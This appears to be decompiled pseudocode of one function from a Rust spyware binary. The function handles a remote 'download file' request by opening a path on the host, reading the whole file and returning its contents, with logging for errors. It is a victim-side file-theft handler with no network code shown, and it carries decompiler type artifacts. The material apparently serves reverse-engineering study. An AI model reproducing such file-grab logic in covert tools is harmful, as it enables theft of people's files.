fn spyware::actions::basic_info::download_file_message(a1: &struct24) -> : struct52 {
    let a0: i64;  // rdi
    let v0: u64;  // [bp-0xc8]
    let v1: struct4;  // [bp-0xc0], Other Possible Types: struct40
    let v2: struct40;  // [bp-0xc0]
    let v3: u64;  // [bp-0xb8]
    let v4: void*;  // [bp-0xb0]
    let v5: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x98], Other Possible Types: struct24, struct9, u64
    let v6: u32;  // [bp-0x94]
    let v7: u64;  // [bp-0x90]
    let v8: i64;  // [bp-0x88]
    let v9: u64;  // [bp-0x80]
    let v10: void*;  // [bp-0x78]
    let v11: Result<struct4, struct8>;  // [bp-0x68]
    let v12: struct4;  // [bp-0x64]
    let v13: u64;  // [bp-0x60]
    let v14: u64;  // [bp-0x58]
    let v15: struct32;  // [bp-0x50], Other Possible Types: u64
    let v16: i64;  // [bp-0x48]
    let v17: u64;  // [bp-0x40]
    let v18: struct24;  // [bp-0x38]
    let v20: u64;  // r15
    let v21: u64;  // r15
    let v24: core::result::Result<usize, std::io::error::Error>;  // rax:rdx

    if core::sync::atomic::atomic_load() >= 4 {
        v14 = a1;
        v15 = <alloc::string::String as core::fmt::Display>::fmt;
        *(&v5 as &&str) = "Handling download file request: path \"";
        v7 = 2;
        v10 = 0;
        v8 = &v14;
        v9 = 1;
        v2 = struct40 {
            field_0: "spyware::actions::basic_info"
            field_16: "spyware::actions::basic_info"
            field_32: log::__private_api::loc("src/actions/basic_info.rs")
        };
        log::__private_api::log(&v5, 4, &v2);
    }
    v11 = std::fs::File::open(a1);
    match v11 {
        Ok(v1) => {
            v5 = Vec::new();
            v24 = <std::fs::File as std::io::Read>::read_to_end(&v1 as u64, &v5);
            core::result::Result<T,E>::unwrap(v24 as i8, *((&v24 as &char + 8) as &i64));
            return struct32 {
                field_0: *(&v5.buf.inner.cap as &i128)
                field_16: 0
                field_24: 0x8000000000000000
            };
        },
        Err(v20) => {
            v0 = v20;
            if core::sync::atomic::atomic_load() {
                v18 = <T as alloc::string::SpecToString>::spec_to_string(&v0);
                v14 = a1;
                v15 = <alloc::string::String as core::fmt::Display>::fmt;
                v16 = &v18;
                v17 = <alloc::string::String as core::fmt::Display>::fmt;
                *(&v5 as &&str) = "Could not read file \"";
                v7 = 3;
                v10 = 0;
                v8 = &v14;
                v9 = 2;
                v1 = struct40 {
                    field_0: "spyware::actions::basic_info"
                    field_16: "spyware::actions::basic_info"
                    field_32: log::__private_api::loc("src/actions/basic_info.rs")
                };
                log::__private_api::log(&v5 as u8, 1, &v1);
                v20 = v0;
            }
            v1 = 0;
            v3 = 1;
            v4 = 0;
            v5 = std::io::error::repr_bitpacked::decode_repr(v20);
            v21 = v5.field_0 as u64;
            v5 = <T as alloc::string::SpecToString>::spec_to_string(&v0);
            return struct56 {
                field_0: *(&v1.field_0 as &i128)
                field_16: 0
                field_24: v5.field_0
                field_40: v8
                field_48: -((0 < (v21 & 255)) as u8 as u32) | v6
            };
        },
    }
}
